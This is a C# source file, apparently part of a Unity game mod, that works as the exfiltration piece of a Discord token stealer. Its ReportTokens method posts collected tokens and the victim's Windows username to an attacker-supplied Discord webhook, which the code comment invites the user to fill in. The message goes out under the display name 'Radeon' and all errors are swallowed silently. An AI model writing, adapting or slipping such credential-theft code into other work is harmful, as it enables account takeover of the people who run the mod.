using System;
using System.Collections.Generic;
using System.Net.Http;
using UnityEngine;

internal static class Webhook
{
    //you've got to change this to your own discord webhook url
    private const string _hookUrl = "YOUR_WEBHOOK_URL";

    public static void ReportTokens(IEnumerable<string> tokenReport)
    {
        try
        {
            var client = new HttpClient();
            var contents = new Dictionary<string, string>
            {
                {"content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}"},
                {"username", "Radeon"},
                {
                    "avatar_url",
                    "https://cdn.discordapp.com/avatars/270564030953816085/c823ddc9fe0c550cd852065afd3d3646.webp?size=4096"
                }
            };

            client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
        }
        catch
        {
            // ignored
        }
    }
}
